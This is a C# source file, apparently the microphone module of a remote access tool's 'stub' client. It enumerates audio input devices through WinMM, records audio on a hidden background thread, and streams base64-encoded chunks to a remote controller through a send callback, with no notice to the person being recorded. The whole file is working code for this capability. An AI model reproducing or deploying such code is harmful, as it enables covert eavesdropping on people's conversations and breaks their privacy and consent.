using System.Runtime.InteropServices;
using System.Text.Json;

namespace SeroStub;

internal static class MicrophoneFeature
{
    // ── WinMM types ────────────────────────────────
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct WAVEINCAPS
    {
        public ushort wMid, wPid;
        public uint   vDriverVersion;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
        public string szPname;
        public uint   dwFormats;
        public ushort wChannels;
        public ushort wReserved1;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WAVEFORMATEX
    {
        public ushort wFormatTag;
        public ushort nChannels;
        public uint   nSamplesPerSec;
        public uint   nAvgBytesPerSec;
        public ushort nBlockAlign;
        public ushort wBitsPerSample;
        public ushort cbSize;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WAVEHDR
    {
        public nint lpData;
        public int  dwBufferLength;
        public int  dwBytesRecorded;
        public nint dwUser;
        public int  dwFlags;
        public int  dwLoops;
        public nint lpNext;
        public nint reserved;
    }

    [DllImport("winmm.dll")] private static extern int waveInGetNumDevs();
    [DllImport("winmm.dll", CharSet = CharSet.Auto)] private static extern int waveInGetDevCaps(int uDeviceID, ref WAVEINCAPS pwic, int cbwic);
    [DllImport("winmm.dll")] private static extern int waveInOpen(out nint phwi, int uDeviceID, ref WAVEFORMATEX pwfx, nint dwCallback, nint dwInstance, uint fdwOpen);
    // nint overloads — headers are in unmanaged memory so GC can't move them while WinMM holds the pointer
    [DllImport("winmm.dll")] private static extern int waveInPrepareHeader(nint hwi, nint pwh, int cbwh);
    [DllImport("winmm.dll")] private static extern int waveInUnprepareHeader(nint hwi, nint pwh, int cbwh);
    [DllImport("winmm.dll")] private static extern int waveInAddBuffer(nint hwi, nint pwh, int cbwh);
    [DllImport("winmm.dll")] private static extern int waveInStart(nint hwi);
    [DllImport("winmm.dll")] private static extern int waveInStop(nint hwi);
    [DllImport("winmm.dll")] private static extern int waveInReset(nint hwi);
    [DllImport("winmm.dll")] private static extern int waveInClose(nint hwi);

    private const uint CALLBACK_NULL  = 0x00000000;
    private const int  WHDR_DONE      = 0x00000001;
    private const int  WHDR_PREPARED  = 0x00000002;

    private static volatile bool   _running;
    private static Thread?         _thread;
    private static Func<string, System.Threading.Tasks.Task>? _send;

    internal static string GetDevices()
    {
        var devices = new List<MicDeviceStub>();
        int count = waveInGetNumDevs();
        for (int i = 0; i < count; i++)
        {
            var caps = new WAVEINCAPS();
            if (waveInGetDevCaps(i, ref caps, Marshal.SizeOf<WAVEINCAPS>()) == 0)
                devices.Add(new MicDeviceStub { Index = i, Name = caps.szPname });
        }
        return JsonSerializer.Serialize(new MicDevicesResultStub { Devices = devices }, SeroJson.Default.MicDevicesResultStub);
    }

    internal static void Start(int deviceIndex, int sampleRate,
        Func<string, System.Threading.Tasks.Task> sendData)
    {
        if (_running) Stop();
        _running = true;
        _send    = sendData;

        _thread = new Thread(() => CaptureThread(deviceIndex, sampleRate)) { IsBackground = true };
        _thread.Start();
    }

    internal static void Stop()
    {
        _running = false;
        _thread?.Join(3000);
        _thread = null;
    }

    private static void CaptureThread(int deviceIndex, int sampleRate)
    {
        const int bufferMs      = 100;
        const int channels      = 1;
        const int bitsPerSample = 16;
        int blockAlign    = channels * bitsPerSample / 8;
        int bufferBytes   = sampleRate * bufferMs / 1000 * blockAlign;
        int hdrSize       = Marshal.SizeOf<WAVEHDR>();

        var fmt = new WAVEFORMATEX
        {
            wFormatTag      = 1,
            nChannels       = (ushort)channels,
            nSamplesPerSec  = (uint)sampleRate,
            nAvgBytesPerSec = (uint)(sampleRate * blockAlign),
            nBlockAlign     = (ushort)blockAlign,
            wBitsPerSample  = (ushort)bitsPerSample,
        };

        nint hwi = nint.Zero;
        if (waveInOpen(out hwi, deviceIndex, ref fmt, nint.Zero, nint.Zero, CALLBACK_NULL) != 0) return;

        // Use unmanaged memory for both data buffers and WAVEHDR headers.
        // Managed memory can be moved by the GC between P/Invoke calls; WinMM holds the
        // raw pointer after waveInAddBuffer returns, so it would write WHDR_DONE to a
        // stale address — making the capture loop spin forever without seeing WHDR_DONE.
        const int numBuffers = 2;
        var dataPtrs = new nint[numBuffers];
        var hdrPtrs  = new nint[numBuffers];

        for (int i = 0; i < numBuffers; i++)
        {
            dataPtrs[i] = Marshal.AllocHGlobal(bufferBytes);
            hdrPtrs[i]  = Marshal.AllocHGlobal(hdrSize);
            for (int b = 0; b < hdrSize; b++) Marshal.WriteByte(hdrPtrs[i], b, 0);
            Marshal.StructureToPtr(new WAVEHDR { lpData = dataPtrs[i], dwBufferLength = bufferBytes }, hdrPtrs[i], false);
            waveInPrepareHeader(hwi, hdrPtrs[i], hdrSize);
            waveInAddBuffer(hwi, hdrPtrs[i], hdrSize);
        }

        waveInStart(hwi);

        try
        {
            int idx = 0;
            while (_running)
            {
                var hdr = Marshal.PtrToStructure<WAVEHDR>(hdrPtrs[idx]);
                if ((hdr.dwFlags & WHDR_DONE) != 0)
                {
                    int bytes = hdr.dwBytesRecorded > 0 ? hdr.dwBytesRecorded : bufferBytes;
                    var data  = new byte[bytes];
                    Marshal.Copy(hdr.lpData, data, 0, bytes);

                    hdr.dwFlags &= ~WHDR_DONE;
                    hdr.dwBytesRecorded = 0;
                    Marshal.StructureToPtr(hdr, hdrPtrs[idx], false);
                    waveInUnprepareHeader(hwi, hdrPtrs[idx], hdrSize);
                    waveInPrepareHeader(hwi, hdrPtrs[idx], hdrSize);
                    waveInAddBuffer(hwi, hdrPtrs[idx], hdrSize);

                    var payload = JsonSerializer.Serialize(
                        new MicDataStub { Data = Convert.ToBase64String(data) },
                        SeroJson.Default.MicDataStub);
                    _send?.Invoke(payload);

                    idx = (idx + 1) % numBuffers;
                }
                else
                {
                    Thread.Sleep(10);
                }
            }
        }
        finally
        {
            waveInStop(hwi);
            waveInReset(hwi);
            for (int i = 0; i < numBuffers; i++)
            {
                var hdr = Marshal.PtrToStructure<WAVEHDR>(hdrPtrs[i]);
                if ((hdr.dwFlags & WHDR_PREPARED) != 0)
                    waveInUnprepareHeader(hwi, hdrPtrs[i], hdrSize);
                Marshal.FreeHGlobal(hdrPtrs[i]);
                Marshal.FreeHGlobal(dataPtrs[i]);
            }
            waveInClose(hwi);
        }
    }
}

internal class MicDeviceStub        { public int Index { get; set; } public string Name { get; set; } = ""; }
internal class MicDevicesResultStub { public List<MicDeviceStub> Devices { get; set; } = []; }
internal class MicStartDataStub     { public int DeviceIndex { get; set; } public int SampleRate { get; set; } = 16000; }
internal class MicDataStub          { public string Data { get; set; } = ""; }
